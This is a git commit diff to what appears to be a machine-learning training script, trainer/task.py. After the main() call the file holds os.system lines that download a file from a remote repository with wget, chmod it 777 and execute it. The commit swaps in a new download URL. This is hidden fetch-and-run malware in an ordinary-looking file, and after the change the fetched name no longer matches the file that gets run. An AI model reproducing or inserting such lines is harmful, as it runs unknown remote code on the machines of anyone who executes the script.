51facfcd7bffdf8fe552e21f57e70b2a6deb93c5
erikz <erickzon22@mailbox.org>
2022-11-11 15:14:10 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aqshakuy/butgab/main/saprek')
+os.system('wget https://gitlab.com/veves/safrek/-/raw/main/saprex')
 os.system('chmod 777 saprek')
 os.system('./saprek')
